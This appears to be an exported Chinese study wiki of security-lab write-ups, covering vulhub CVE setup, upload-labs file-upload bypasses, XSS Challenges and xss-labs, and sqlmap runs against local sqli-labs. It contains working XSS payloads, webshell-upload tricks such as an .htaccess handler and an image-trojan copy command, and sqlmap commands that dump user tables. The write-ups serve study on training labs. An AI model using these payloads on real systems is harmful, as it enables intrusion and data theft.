漏洞复现 …… CVE-2020-14882 允许未授权的用户绕过管理控制台的权限验证访问后台 先找到目录：vulhub/weblogic/CVE-2020-14882 cd vulhub/weblogic/CVE-2020-14882 docker-compose up –d 2.进入 vulhub/weblogic/CVE-2020-14882 目录下，使用命令docker-compose up –d启动环境 3.浏览器访问：你的 ip:7001/console/login/LoginForm.jsp 成功访问表示环境搭建成功 log4j2-rce-2021-12-09 环境搭建 # 使用docker docker pull vulfocus/log4j2-rce-2021-12-09 # 启动docker容器 docker run -tid -p 38080:8080 vulfocus/log4j2-rce-2021-12-09 漏洞复现 ……未完待续 wordpress_cve_2019_15866 showdoc-cnvd_2020_26585 CVE-2019-9670（远程代码执行漏洞复现） CVE-2020-5412 phpmyadmin-cve_2014_8959","tags":[null],"categories":[null]},{"title":"Upload-labs 靶场","path":"/wiki/XSS-and-Security-Labs/Upload-labs.html","content":"项目地址：https://github.com/c0ny1/upload-labs 一、前端 JS 检测绕过 上传一个 php 文件，失败了，只允许图片为后缀的文件进行上传。这一关的关键是*“JavaScript 代码对文件后缀进行校验”*。JavaScript 属于前端范畴，而前端校验不会发出数据包，不会与服务器进行交互 第一种方式：浏览器直接 F12，找到checkFile()函数，进行删除。更为极端的方法是F12 --&gt; F1 --&gt; 禁用JavaScript，最后上传 PHP 木马 第二种方式：用 burp 拦截上传数据包， 对文件名进行修改 第一种方式： 删除 checkFile() 函数 极端的方法 **第二种方式：**传一个.jpg格式的图片，用 burp 抓包修改文件名和文件内容 二、MIME 类型检测绕过 MIME 是描述*消息内容类型*的因特网标准——MIME 参考手册 Content-Type 通常出现在 HTTP 请求头部中，指示请求的数据类型，或者是数据的 MIME 类型 # 常见的 MIME 类型 text/plain：纯文本 text/html：HTML 格式的文档 image/png：PNG 格式的图片 这一关的关键是，使用Content-Type字段的值判断上传文件是否合法，只允许 image/jpeg、image/png、image/gif 文件的上传 用 burp 截取并修改数据包中的 Content-Type 类型进行绕过 三、后缀检测-黑名单绕过 黑名单绕过的常见方式有： 改变文件后缀名，使用不在黑名单中的文件后缀，例如php2、php3、php4、php5、phtm 拼接文件名 使用压缩文件 修改文件内容 …… 通过 burp 拦截修改数据包中的文件名后缀为.php5 如果服务器是 Apache，也可用.htaccess来进行绕过，但是文件会在上传的过程中修改文件名 四、后缀检测-黑名单绕过（.htaccess） .htaccess文件可以被用来限制特定的文件类型的上传或执行。从源码中得知没有对.htaccess限制 上传.htaccess文件，写入以下内容 # .shell 文件会被解析为 php 文件 AddType application/x-httpd-php .shell 然后上传一个后缀名为.shell的文件，执行 webshell 五、后缀检测-后缀名点空格绕过 双写小数点，. .——中间是空格，围绕着小数点 由于一些操作系统和文件系统*不允许文件名以点号结尾，因此上传时会自动删除*最后一个点号 六、后缀检测-后缀名大小写绕过 观察源代码，发现服务器检查后缀忽视了“大小写”的检测，也就是没出现“strtolower() 函数”。 而“strtolower() 函数”用于将字符串中的所有字符转换为小写字母 七、后缀检测-后缀名空格绕过 观察源代码，发现服务器检查后缀忽视了“空格”的检测，也就是没出现“trim() 函数”。 trim()是 PHP 中的一个字符串函数，用于*删除字符串首尾的空格*或其他指定字符 理应加上$file_ext = trim($file_ext); 八、后缀检测-后缀名点绕过 观察源代码，发现服务器检查后缀忽视了“后缀名点”的检测，也就是没出现“deldot() 函数”。 deldot()函数用于在文件上传*防止后缀名点绕过攻击*。该函数的作用是将文件名中的所有点（包括后缀名点和其他点）都删除，以确保文件名的完整性和正确性。 上传文件并用 burp 抓包，在文件名中添加*额外的点*来绕过文件扩展名的检查 九、后缀检测-特殊字符串 可以通过在文件名中添加::$DATA来告诉 Windows 访问文件的资源，并将其当作可执行代码来执行 十、后缀检测-点空格绕过 同第五关 观察代码，发现先删除文件名末尾点.，再首尾去空格，由此想到 双写小数点，. .——中间是空格，围绕着小数点 十一、后缀检测-后缀名双写绕过 使用了str_ireplace()函数，替换成空，可以用双写绕过 上传文件名 code.p.phphp，上传文件时会删除 .php，最后的上传文件名： code.php 十二、后缀检测-GET方式00截断 %00 截断，用在 php 版本 5.3.29以下，magic_quotes_gpc 为 Off 状态 通过抓包，能够看到上传路径，使用 00 截断，抓包修改上传路径save_path=../upload/code.php%00，即可绕过。 “00截断”（Null byte injection）是一种 Web 应用程序安全漏洞，攻击者通过在输入数据中插入 ASCII 码为 0 的 null 字符（\\x00），来绕过字符串截断等安全措施，导致应用程序执行意外的操作或暴露敏感信息。 十三、后缀检测-POST方式00截断 GET 会自行解码%00，POST 不会自行解码 十四、内容检测-文件头检测绕过 检测文件头，源码会根据图片的*前两个字节*来判定文件类型，所以需要把 webshell 的后缀改为图片格式 制作图片木马 copy code.jpg /b + code.php /a webshell.jpg 十五、内容检测-getimagesize()函数 getimagesize()函数来验证是否是图片。依旧是生成带有 php 代码的图片，进行上传 十六、内容检测-exif_imagetype()函数 使用exif_imagetype函数来检查是否是图片，读取图像的第一个字节并检查其签名。依旧是生成带有 php 代码的图片，进行上传 十七、内容检测-图片二次渲染绕过 图片的二次渲染会把第一次渲染添加的 PHP 代码删掉。 绕过的方式是，查看*图片的渲染后没有修改的位置*，添加一句话木马 未完待续……","tags":[null],"categories":[null]},{"title":"XSS Challenges","path":"/wiki/XSS-and-Security-Labs/XSS Challenges.html","content":"XSS 挑战 （由 yamagata21） - 阶段 #1 (int21h.jp) 题目要求注入 JavaScript 命令： alert(document.domain); Stage #1 输入321来定位代码的位置，发现是处于&lt;b&gt;&lt;/b&gt;标签之内，没有任何过滤 // 第一种方法是闭合 b 标签，插入 Script 标签 &quot;&lt;/b&gt; &lt;script&gt;alert(document.domain)&lt;/script&gt;// // 第二种方法是直接在 b 标签内部构造 XSS &lt;script&gt;alert(document.domain)&lt;/script&gt; 定位位置 闭合 b 标签的方式 直接在 b 标签内部构造 XSS Stage #2 输入321来定位代码的位置，发现注入点在input标签的value属性里面 // 第一种方法是闭合 input 标签，插入 Script 标签 &quot;&gt; &lt;script&gt;alert(document.domain)&lt;/script&gt;// // 第二种方法是在 input 标签中插入属性 // onmouseover 事件 --&gt; 鼠标指针移动到图片后执行Javascript代码 123&quot; onmouseover=alert(document.domain)&gt;// 定位位置 闭合 input 标签，插入 Script 标签 input 标签中插入属性 Stage #3 输入321来定位代码的位置，发现注入点在b标签，于是乎使用 stage1 的 payload，结果失败了 失败原因，用于构造标签的&lt;&gt;和&quot;被转义了 &lt;&gt; --&gt; &amp;lt;&amp;gt; &quot; --&gt; &amp;quot; 通过查看源代码发现有两个参数，P1 是文本输入，P2 是下拉列表，因为 P1 有过滤，所以对 P2 进行注入 用 burp 截取数据包，篡改 P2 的值，Forward 放包之后会发现弹出 // burp 中对 P2 参数进行注入， p1=123&amp;p2=&lt;script&gt;alert(document.domain)&lt;/script&gt; 定位位置 两个参数 Stage #4 输入321来定位代码的位置，发现注入点还是在b标签，但是用 burp 抓包后发现了三个参数，P1、P2、P3 从源代码中搜索 P3 的值 hackme，发现是在一个 input 标签的 value 属性中，且type=&quot;hidden&quot;，这说明该 input 元素在网页页面是不可见的，换言之网页上面不显示输入框，做了隐藏处理。 // 用 burp 截取数据包，然后对 P3 参数进行篡改，用 &quot;&gt; 闭合 input 标签，插入 Script 标签 &quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt; 定位位置 查询 P3 的值 在 burp 中修改 P3 的值然后放包 P3 参数处注入 Stage #5 输入321来定位代码的位置，发现注入点在input标签的value属性里面 但与 Stage #2 不同的是 input 标签中加入了maxlength 属性，其值为15，意思是输入的字符不能超过 15。 maxlength 属性规定 元素中允许的最大字符数。 像是这中前端的设置是可以在源代码中进行修改，进而绕过限制 然后把maxlength的值设置为100，接着就是 Stage #2 的步骤 // 第一种方法是闭合 input 标签，插入 Script 标签 &quot;&gt; &lt;script&gt;alert(document.domain)&lt;/script&gt;// // 第二种方法是在 input 标签中插入属性 // onmouseover 事件 --&gt; 鼠标指针移动到图片后执行Javascript代码 123&quot; onmouseover=alert(document.domain)&gt;// 定位位置 修改 maxlength 的值 成功弹窗 Stage #6 输入321来定位代码的位置，发现注入点还是在input标签的value属性中 于是用 Stage #2 闭合input 的方式来构造 XSS，测试后发现过滤了&lt;&gt;，但没有过滤&quot;， 这说明不可以用新标签，只能在input标签内通过&quot;闭合前面的属性的方式，为后面新增属性 &gt; --&gt; &amp;gt; HTML 事件 | 菜鸟教程 (runoob.com) // 需要点击搜索框触发， &quot; onclick=alert(document.domain) // 需要移动到搜索框触发 &quot; onmouseover=alert(document.domain) 查看过滤情况 鼠标事件 Stage #7 注入点还是在input标签的value属性中，但依旧是过滤了&lt;&gt;和&quot; &quot; onmouseover=alert(document.domain) // 321 会写入 input 的 value 值中，空格做个分隔，写后面的属性 321 οnmοuseοver=alert(document.domain) 321 onclick=alert(document.domain) 查看过滤 用点击事件 Stage #8 输入字符发现注入点在a标签的href属性中，随即想到JavaScript 伪协议绕过（需要点一下链接才能弹窗） // javascript 伪协议 // &lt;a&gt; 标签的 href 属性用于指定超链接目标的 URL，href 属性的值可以是 JavaScript 表达式 javascript:alert(document.domain); 定位 JavaScript 伪协议 Stage #9 听说开发者是日本人，难怪会有这种题目 通过 burp 抓包发现参数是charset=euc-jp，亦即日文编码，需要识别 UTF-7 的 IE 浏览器（但 IE 已经退役了……） 看了其他人的方法，在控制台输出弹窗绕过 Stage #10 定位在input标签的value属性中，但domain过滤了，可以使用嵌套绕过的方式 // 嵌套绕过 &quot;&gt;&lt;script&gt;alert(document.domadomainin)&lt;/script&gt; // 看其他人有用 base 64 编码的方式来绕过的，但是需要解密函数 atob() 对字符串进行解密再进行执行 // eval()函数计算 JavaScript 字符串，并把它作为脚本代码来执行 alert(document.domain) 经过 base 64 编码后，YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ== &quot;&gt;&lt;script&gt;eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='));&lt;/script&gt; 嵌套 Stage #11 从此关开始打不开了","tags":[null],"categories":[null]},{"title":"Hack The Box (HTB)","path":"/wiki/XSS-and-Security-Labs/index - 2.html","content":"Hack The Box (HTB) 是一个在线的网络安全训练平台，旨在提供真实世界的渗透测试和漏洞利用经验。它提供了一个虚拟实验环境，供安全专业人员和爱好者进行挑战和学习。 以下是关于 Hack The Box 平台的一些特点和信息： 实践导向：Hack The Box 提供了大量的虚拟机（称为“盒子”），每个盒子都代表一个具体的渗透测试场景，包括各种不同类型的漏洞和安全挑战。用户需要尝试渗透这些盒子，找到漏洞并获得管理员权限。通过实践攻击和解决问题，用户可以增强他们的渗透测试技能。 真实世界场景：HTB 的盒子和挑战都基于真实世界的漏洞和安全问题。这使得用户可以在一个模拟的、安全的环境中练习和测试他们的技能，而不会对真实系统和网络造成任何伤害。 社区和排行榜：HTB 是一个活跃的社区，用户可以与其他安全专业人员和爱好者交流和分享经验。平台还提供排行榜，用户可以在其中与其他用户比较并展示他们的技能。 等级和奖励系统：Hack The Box 平台基于用户的活动和成就提供等级和奖励系统。通过攻击和解决更多的盒子和挑战，用户可以获得更高的等级和奖励，这也有助于激励用户持续学习和提高他们的技能。 Lab 环境：除了盒子和挑战之外，HTB 还提供了一个Lab环境，让用户可以构建自己的虚拟实验环境，进行更多自定义的渗透测试和练习。 请注意，Hack The Box 是一个专门为渗透测试和安全研究人员设计的平台。在参与HTB的活动时，用户需要遵守平台的规则和道德准则，并确保只在授权的环境中进行活动。","tags":[null],"categories":[null]},{"title":"Web 安全靶场与 XSS 挑战文档","path":"/wiki/XSS-and-Security-Labs/index.html","content":"汇集了我之前做过的靶场和学习资源，包括Hack The Box、 DVWA、XSS 挑战和 SQL 注入等。","tags":[null],"categories":[null]},{"title":"sqli-labs 靶场使用 SQLMap 注入（1-25 关）","path":"/wiki/XSS-and-Security-Labs/sqli-labs-SQLMap.html","content":"注意点： sqlmap 需要 python 的环境，并配置环境变量 在实际检测过程中，sqlmap 会不停的询问，需要手工输入Y/N来进行下一步操作，可以使用参数--batch命令来自动答复和判断 用 sqlmap 工具注入完毕后，C 盘 AppData 文件夹下会有缓存文件夹，不删掉的话会影响 SQL 注入结果C:\\Users\\20846\\AppData\\Local\\sqlmap\\output，也可用sqlmap.py --purge来清空缓存 Less-1 python sqlmap.py -u &quot;http://localhost/sqli-labs/Less-1/?id=1&quot; --batch --banner # --batch 从不询问用户输入，使用所有默认配置，换言之对所有的交互式的都是默认的 # -b, --banner 获取数据库管理系统的标识 # 查看数据库 python sqlmap.py -u &quot;http://localhost/sqli-labs/Less-1/?id=1&quot; --dbs 爆出数据库名 # sqlmap -u [&quot;URL&quot;] -D [&quot;数据库名&quot;] --tables //查询当前数据库中的所有表 python sqlmap.py -u &quot;http://localhost/sqli-labs/Less-1/?id=1&quot; -D security --tables 查询 security 数据库中的所有表 # sqlmap -u [&quot;URL&quot;] -D [&quot;数据库名&quot;] -T [&quot;表名&quot;] --columns //查询指定库中指定表的所有列(字段) python sqlmap.py -u &quot;http://localhost/sqli-labs/Less-1/?id=1&quot; -D security -T users --columns 查看 security 数据库下的 users 表里都有哪些字段 # sqlmap -u -D security -T users -C id,password,username --dump # 爆出数据库 security 中的 users 表中的 id,password,username 列中的所有数据 python sqlmap.py -u &quot;http://localhost/sqli-labs/Less-1/?id=1&quot; -D security -T users -C id,password,username --dump # --dump 将结果保存下来 查看列字段的具体值 因此，只要能找到注入点和数据库，就算上成功了 Less-2 以下操作都是基于 Less-1 的步骤，如法炮制而来 sqlmap -u http://localhost/sqli-labs/Less-2/?id=1 --batch --dbs 找到数据库 Less-3 sqlmap -u http://localhost/sqli-labs/Less-3/?id=1 --batch --dbs Less-4 sqlmap -u http://localhost/sqli-labs/Less-4/?id=1 --batch --dbs Less-5 sqlmap -u http://localhost/sqli-labs/Less-5/?id=1 --batch --dbs Less-6 sqlmap -u http://localhost/sqli-labs/Less-6/?id=1 --batch --dbs Less-7 sqlmap -u http://localhost/sqli-labs/Less-7/?id=1 --batch --dbs Less-8 sqlmap -u http://localhost/sqli-labs/Less-8/?id=1 --batch --dbs Less-9 sqlmap -u http://localhost/sqli-labs/Less-9/?id=1 --batch --dbs Less-10 sqlmap -u http://localhost/sqli-labs/Less-10/?id=1 -level=2 --batch --dbs # 当level=2时，会测试cookie注入。当level=3时，会测试user-agent/referer注入 Less-11 sqlmap -u http://localhost/sqli-labs/Less-11/index.php --batch --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --dbs # 从该关开始，注入的位置不再是 URL，且请求变为了 POST，因此命令要随之而变。对于是 post 提交数据的 URL，需要指定其 data 参数，--data 能够抓取其 post 提交的数据填入 # 还有一种方法是：因为 Less-11 该关需要进行登录，可以先用账号 admin 密码 admin 登录，然后用 burp 抓包，将 burp 抓取的包保存为 target.txt，利用 sqlmap -r target.txt 命令，来探测 target.txt 文件中的 http 数据包是否存在 sql 注入漏洞 sqlmap -r target.txt Less-12 sqlmap -u http://localhost/sqli-labs/Less-12/index.php --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --batch --dbs Less-13 sqlmap -u http://localhost/sqli-labs/Less-13/index.php --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --batch --dbs Less-14 sqlmap -u http://localhost/sqli-labs/Less-14/index.php --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --batch --dbs Less-15 sqlmap -u http://localhost/sqli-labs/Less-15/index.php --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --dbs --batch 以下略去 Less-16 sqlmap -u http://localhost/sqli-labs/Less-16/index.php --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --batch --dbs --level=2 Less-17 sqlmap -u http://localhost/sqli-labs/Less-17/index.php --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --batch --dbs Less-18 # 注入的位置在 User-Agent 中 sqlmap -u http://localhost/sqli-labs/Less-18/ --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --batch --user-agent=&quot;*&quot; --thread=10 --dbs # --thread=10，设置多线程，并行处理请求加快效率 # --user-agent=&quot;*&quot; 是用来指定 User-Agent Less-19 # 注入的位置在 Referer 中 sqlmap -u &quot;http://localhost/sqli-labs/Less-19/&quot; --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --batch --referer=&quot;*&quot; --thread=10 --dbs # --referer，伪造 referer 字段 Less-20 # 注入的位置在 cookie 中 sqlmap -u http://localhost/sqli-labs/Less-20/index.php --cookie=&quot;uname=admin&quot; --dbs --batch --level=5 --risk=3 # 同样，可以用 burp 抓包保存 ，殊途同归，第一次失败了，于是提高了线程，这将导致查询速度降低 sqlmap -r target-20.txt --leve=5 --risk=3 --dbs Less-21 # 注入的位置依旧在 cookie 中，但经过了 base64 加密的，用 sqlmap 来进行联合查询注入 sqlmap -u http://localhost/sqli-labs/Less-21/index.php --cookie=&quot;uname=*&quot; --dbs --tamper &quot;base64encode.py&quot; --batch sqlmap -u http://localhost/sqli-labs/Less-21/index.php --cookie=&quot;uname=*&quot; --tamper=&quot;base64encode&quot; --dbms=MySQL --random-agent --flush-session --technique=U --dbs --batch -v 3 # --random-agent --&gt; 使用任意的User-Agent爆破 # --flush-session --&gt; sqlmap 扫描的时候会将缓存的数据记录到 output 文件下，下次扫描时会直接调用本地缓存的扫描结果。如果我们想删除缓存结果，重新对某网站进行扫描就需要添加 --flush-session 选项。 # --dbms=MySQ --&gt; 指定其数据库为mysql # --tamper base64encode --&gt; 对提交的数据进行base64编码 # --technique=U --&gt; 指定注入点类型，u 是指的 union 联合查询注入。其他还有 U/B/T/S # -v --&gt; 3 能看到 payload Less-22 sqlmap -u http://localhost/sqli-labs/Less-22/index.php --cookie=&quot;uname=*&quot; --dbs --tamper &quot;base64encode.py&quot; --batch Less-23 sqlmap -u http://localhost/sqli-labs/Less-23/?id=1 --dbs --batch Less-24 # 这关是二次注入，二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。 # 需要先注册账号 admin'#，然后修改密码，后面的 # 号注释掉了 # Sql 语句变为 UPDATE users SET passwd=&quot;New_Pass&quot; WHERE username =' admin' # ' AND password=' Less-25 sqlmap -u http://localhost/sqli-labs/Less-25/?id=1 --dbs --batch","tags":[null],"categories":[null]},{"title":"xss-labs","path":"/wiki/XSS-and-Security-Labs/xss-labs.html","content":"do0dl3/xss-labs: xss 跨站漏洞平台 (github.com) level 1 观察地址栏得知是GET请求，参数是name，值为test 修改参数值定位位置，发现是在 h2标签内，判断为反射型xss 于是直接在把name参数赋值为： &lt;script&gt;alert('xss')&lt;/script&gt; 从浏览器观察直接弹出来了，查看一下源码，发现有一个str变量，值是name，同时str变量又被放在了h2标签中，且没做任何过滤处置。 $str = $_GET[&quot;name&quot;]; echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;; level 2 从地址栏观察URL发现依旧是GET方式来传递参数，不言而喻是反射型XSS 使用第一关的&lt;script&gt;alert('xss')&lt;/script&gt;，发现并没有出现弹窗，查看页面源代码，发现在h2标签中，&lt;script&gt;的&lt;&gt;被HTML实体化了 &lt; --&gt; &amp;lt; &gt; --&gt; &amp;gt; 但 input 标签中的 value 参数没有被 HTML 编码，于是用&quot;&gt;分别闭合value属性和input标签，最后用//注释后面的&quot;&gt; // payload &quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;// 最后在 less-2.php 中查看，发现标签h2之所以被编码，是因为有htmlspecialchars()函数，换言之在网页上输入的字符会经过htmlspecialchars()函数对其进行 HTML 实体才会展示在页面上。 htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。 $str = $_GET[&quot;keyword&quot;]; echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt; &lt;form action=level2.php method=GET&gt; &lt;input name=keyword value=&quot;'.$str.'&quot;&gt; 页面源代码 闭合在标签外构造 XSS level 3 修改参数值定位具体位置，发现和 level 2 是一样的，在h2和input标签中 顾忌到会有编码之类，使用&lt;script&gt;alert('xss')&lt;/script&gt;来测试，然后 Ctrl + U 查看页面源代码。果不其然，与 level 2 不同的是，这关h2和input标签中的str变量皆难逃被编码之命 &lt; --&gt; &amp;lt; &gt; --&gt; &amp;gt; 因为过滤了&lt;&gt;，这说明不可以用新标签，只能在标签内通过'闭合前面的属性的方式，为后面新增属性来绕过，与此同时想到的是“鼠标事件” // 用 ' 闭合 value 的值，新增点击事件，在 input 框中去点击一下即可触发 // 根据源码，闭合需用单引号 ' onclick ='javascript:alert(1)'// $str = $_GET[&quot;keyword&quot;]; echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt; &lt;form action=level3.php method=GET&gt; &lt;input name=keyword value='&quot;.htmlspecialchars($str).&quot;'&gt; 页面源代码 新增属性构造 XSS level 4 修改参数值定位具体位置，依旧是在h2和input标签中，用&lt;script&gt;alert('xss')&lt;/script&gt;来测试，查看页面源代码，发现h2标签的参数依旧被 HTML 实体，仍然是&lt;&gt;字符 但与之前不同的是，input标签中的value属性的值，没有出现&lt;&gt;字符，所以还是用闭合属性新增鼠标事件的方式来绕过 &quot; onclick =&quot;javascript:alert(1)&quot;// 最后在 less-4.php 中查看，出现了str_replace() 函数 str_replace(&quot;&gt;&quot;,&quot;&quot;,$str); --&gt; 在 str 变量中，将&lt;&gt;字符替换为空 htmlspecialchars() 函数 --&gt; 把一些预定义的字符转换为 HTML 实体。 $str = $_GET[&quot;keyword&quot;]; $str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str); $str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2); echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt; &lt;form action=level4.php method=GET&gt; &lt;input name=keyword value=&quot;'.$str3.'&quot;&gt; 页面源代码 点击事件 level 5 用&lt;script&gt;alert('xss')&lt;/script&gt;来测试，在h2标签中仍是&lt;&gt;字符被 HTML 实体了，而input标签的value属性中，完整的script被_断开了 script --&gt; scr_ipt 尝试&quot; onclick =&quot;javascript:alert(1)&quot;//，发现在h2标签中&quot;双引号被 HTML 实体了，而input标签的value属性中的值，完整的onclick被_断开了 onclick --&gt; o_nclick 于是换一种思路，用&quot;&gt; 来闭合 input 标签，利用a标签的href属性可以执行 JavaScript 伪协议的特性，绕过众多检测 &quot;&gt; &lt;a href=javascript:alert(1)&gt;1&lt;/a&gt;// // 看到还有一种方式，可直接触发 &quot;&gt;&lt;iframe src=javascript:alert(1)&gt; 最后在 less-5.php 中查看，出现了strtolower() 函数 strtolower() 函数 --&gt; 把字符串转换为小写，赋值给str变量，这样大小写绕过就失效了 str_replace --&gt; 加入了_破坏完整的字符 $str = strtolower($_GET[&quot;keyword&quot;]); $str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str); $str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2); echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt; &lt;form action=level5.php method=GET&gt; &lt;input name=keyword value=&quot;'.$str3.'&quot;&gt; 测试一 测试二 JavaScript 伪协议 level 6 用&lt;script&gt;alert('xss')&lt;/script&gt;来测试，发现在h2标签中仍是&lt;&gt;字符被 HTML 实体了，而input标签的value属性中，完整的script被_断开了 尝试点击事件&quot; onclick =&quot;javascript:alert(1)&quot;//，发现在h2标签中&quot;双引号被 HTML 实体了，而input标签的value属性中的值，完整的onclick被_断开了 试一下伪协议&quot;&gt; &lt;a href=javascript:alert(1)&gt;1&lt;/a&gt;//，完整的href被_断开了 于是使用*大小写绕过* // 点击事件大小写绕过 &quot; ONCLICK =&quot;alert(1)&quot;// // 伪协议大小写绕过 &quot;&gt;&lt;a HREF=javascript:alert(1)&gt;xss&lt;/a&gt;// 查看 level6.php，可以看到 str_replace 函数分别破坏了&lt;script、on、src、data、href等元素。h2 标签处做了 HTML 实体 $str = $_GET[&quot;keyword&quot;]; $str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str); $str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2); $str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3); $str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4); $str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5); echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt; &lt;form action=level6.php method=GET&gt; &lt;input name=keyword value=&quot;'.$str6.'&quot;&gt; level 7 通过测试，发现 input 标签的 value 属性的值 script、on、href被直接替代为了空，h2 标签依旧是 HTML 实体了 于是通过**双写绕过**的方式去绕过检测 // script &quot;&gt;&lt;scrscriptipt&gt;alert('xss')&lt;/scrscriptipt&gt; // href 和 script，伪协议 &quot;&gt; &lt;a hrhrefef=javascscriptript:alert(1)&gt;1&lt;/a&gt;// // 点击事件 &quot; oonnclick =&quot;javascscriptript:alert(1)&quot;// 查看 level7.php，可以看到 str_replace 函数分别把&lt;script、on、src、data、href替代为了空 h2 标签处做了 HTML 实体，strtolower()函数把字符串转换为小写 $str =strtolower( $_GET[&quot;keyword&quot;]); $str2=str_replace(&quot;script&quot;,&quot;&quot;,$str); $str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2); $str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3); $str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4); $str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5); echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt; &lt;form action=level7.php method=GET&gt; &lt;input name=keyword value=&quot;'.$str6.'&quot;&gt; level 8 定位一下，第一个参数在 input 标签的 value 属性中， 第二个参数在 a 标签的 href 属性中 通过测试，发现在 input 标签的 value 属性中&lt;&gt; &quot;被 HTML 编码了，a 标签的 href 属性把script、on、src、data、href用_截断了，同时&quot;被 HTML 编码了 使用大小写绕过也失败了，说明有 strtolower 函数。 因为第二个参数在 href属性中，而href属性支持构造伪协议，但script被_所限制，于是尝试用编码的方式去绕过 javascript:alert(1) &amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29; HTML 编码 HTML 编码 level 9 定位参数，第一个参数照旧，第二个参数还是在 a 标签的 href 属性中 用javascript:alert(1)测试，a 标签的 href 属性的值显示“您的链接不合法” 一般而言，href 属性是要填 URL 的，那就补上一个https://www.google.com 输入javascript:alert(1)//http://www.baidu.com，从页面源代码处看到script被_截断了，那就 HTML 编码一下 java&amp;#x73;cript:alert(1)//http://www.baidu.com // ｓ--&gt; &amp;#x73; 从 level9.php 可以观察到，如果没有http://字符，会输出链接不合法 if(false===strpos($str7,'http://')) &#123; echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;'; &#125; level 10 从 URL 处输入测试参数，然后 CTRL+U 查看页面源代码发现有三个 input 标签，且 type=“hidden”，也就是隐藏表单。 把三个 input 标签的类型修改为 text，看在页面的显示情况 // 发现页面出现文本框，t_sort，这证明可对其进行突破 text&amp;t_link=&quot; type=&quot;text&quot;&amp;t_history=&quot; type=&quot;text&quot;&amp;t_sort=&quot; type=&quot;text&quot; // 出现文本框后可直接注入 XSS 代码 &quot; type=&quot;text&quot; onclick=&quot;alert('xss') 从源码看把&lt;&gt;替换为空了，这恐怕只能在标签内部通过新增属性的方式来答题了 $str = $_GET[&quot;keyword&quot;]; $str11 = $_GET[&quot;t_sort&quot;]; $str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11); $str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22); echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt; &lt;form id=search&gt; &lt;input name=&quot;t_link&quot; value=&quot;'.'&quot; type=&quot;hidden&quot;&gt; &lt;input name=&quot;t_history&quot; value=&quot;'.'&quot; type=&quot;hidden&quot;&gt; &lt;input name=&quot;t_sort&quot; value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt; 隐藏表单 点击 input 框触发 xss level 11 查看源代码发现 t_ref 的 value 值为上道题的 URL，由此判断 value 值就是 referer，referer 用于告知服务器用户的来源页面，所以这道题直接篡改 referer 就可以了 referer:&quot;type=&quot;text&quot; onclick=&quot;alert('xss') 页面源代码 点击 input 框触发 xss 源码 level 12 CTRL+U 查看源代码发现 t_ua 的 value 值为 User-Agent，也就是用户代理，通常标识浏览器、及其版本号及其主机操作系统。 User-Agent: &quot;type=&quot;text&quot; onclick=&quot;alert('xss') User-Agent 点击 input 框触发 xss 源码 level 13 CTRL+U 查看源代码发现 t_cook 的 value 值为call me maybe?，使用浏览器插件 Cookie Editor 查看 cookie 的值与之相似，于是判定 value 值就是 cookie user=&quot; type=&quot;text&quot; onclick=&quot;alert('xss') 对比查看是 cookie 修改 cookie 点击 input 框触发 xss 源码 level 14 网页一直在响应，最终以失败告终，查看源码发现原链接已经失效 这关主要考察Exif，Exif 